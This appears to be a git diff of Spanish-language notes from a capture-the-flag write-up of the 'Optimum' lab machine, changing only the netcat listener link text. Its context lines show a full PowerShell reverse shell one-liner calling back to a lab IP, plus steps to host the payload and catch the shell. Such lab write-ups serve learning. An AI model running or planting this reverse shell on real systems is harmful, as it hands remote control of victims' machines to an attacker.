@@ -99,7 +99,7 @@ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',443);$stream = $
 Vamos a estar hosteando el archivo con un server de [[python3 -m http.server]] con el comando `python3 -m http.server 80` para que se descarge el archivo *reverse.ps1* con el cual vamos a inyectar el payload
 
 ![[Optimum9.png]]
-Mientras estamos en escucha con [[rlwrap nc -lvnp 443]] 
+Mientras estamos en escucha con [[rlwrap -cAr nc -lvnp 443]] 
 
 Ejecutamos la vulnerabilidad mediante este link, solamente cambiando la ip desde la cual se va a descargar el archivo
 
@@ -225,7 +225,7 @@ Ahora vamos a crear el archivo *rev.ps1* que seria lo mismo que el archivo *reve
 $client = New-Object System.Net.Sockets.TCPClient('10.10.16.12',5000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-Mientras estamos en escucha con [[rlwrap nc -lvnp 443]] con el comando `rlwrap nc -nlvp 5000` y con un server [[python3 -m http.server]] con el comando `python3 -m http.server 80` hosteando todos los archivos
+Mientras estamos en escucha con [[rlwrap -cAr nc -lvnp 443]] con el comando `rlwrap nc -nlvp 5000` y con un server [[python3 -m http.server]] con el comando `python3 -m http.server 80` hosteando todos los archivos
 
 Vamos a ejecutar desde la maquina victima el comando [[Descargar archivos que procesos de 32 bits accedan a version de 64 bits system32]]
 
